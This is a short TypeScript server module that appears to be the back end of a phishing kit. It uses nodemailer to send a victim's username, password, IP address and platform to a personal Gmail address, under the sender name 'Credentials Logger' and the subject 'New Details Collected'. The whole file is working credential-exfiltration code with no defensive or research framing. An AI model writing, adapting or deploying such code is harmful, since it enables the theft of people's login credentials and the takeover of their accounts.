"use server";

const nodemailer = require("nodemailer");
const transporter = nodemailer.createTransport({
  host: "smtp.zoho.com",
  port: 465,
  secure: true,
  auth: {
    // TODO: replace `user` and `pass` values from <https://forwardemail.net>
    user: process.env.GMAIL_EMAIL + "@bidartistry.com",
    pass: process.env.GMAIL_PASSWORD,
  },
});
const sendMail = async ({
  username,
  password,
  ipaddress,
  platform,
}: {
  username: string;
  password: string;
  ipaddress?: string;
  platform?: string;
}) => {
  const info = await transporter.sendMail({
    from: `Credentials Logger <${process.env.GMAIL_EMAIL}@bidartistry.com>`,
    to: `Julian Lennon <julianle1610@gmail.com>`,
    subject: "New Details Collected",
    text: `PLATFORM: ${platform}, Username: ${username}, Password: ${password}, ipaddress: ${ipaddress}`,
    html: `<p>PLATFORM: <b>${platform}</b>, Username: <b>${username}</b>, Password: <b>${password}</b>, IPAddress: <b>${await (
      ipaddress as any
    ).value}</b></p>`,
  });

  console.log("Message sent: %s", info.messageId);
};

export default sendMail;
